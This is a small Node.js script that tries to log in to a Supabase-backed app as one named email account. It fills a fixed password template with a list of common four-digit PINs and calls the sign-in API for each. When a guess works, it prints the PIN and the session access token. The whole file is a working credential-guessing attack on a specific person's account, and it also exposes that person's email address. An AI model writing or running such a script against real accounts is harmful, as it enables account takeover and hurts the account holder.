require('dotenv').config({ path: '.env.local' });
const { createClient } = require('@supabase/supabase-js');

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY);

const email = `ginnorivera@gmail.com`;
const buildPassword = (pin) => `Caserita#${pin}2026!`;

const commonPins = ["1234", "0000", "1111", "2222", "1230", "1010", "4321", "2026"];

async function testPins() {
    for (const pin of commonPins) {
        console.log(`Trying PIN ${pin} for ${email}...`);
        const { data, error } = await supabase.auth.signInWithPassword({
            email,
            password: buildPassword(pin)
        });

        if (!error) {
            console.log(`🎉 SUCCESS! PIN is ${pin}`);
            console.log('Access token:', data.session.access_token);
            process.exit(0);
        } else {
            console.log(`❌ Fail: ${error.message}`);
        }
    }
    console.log('All common PINs failed.');
    process.exit(1);
}

testPins();
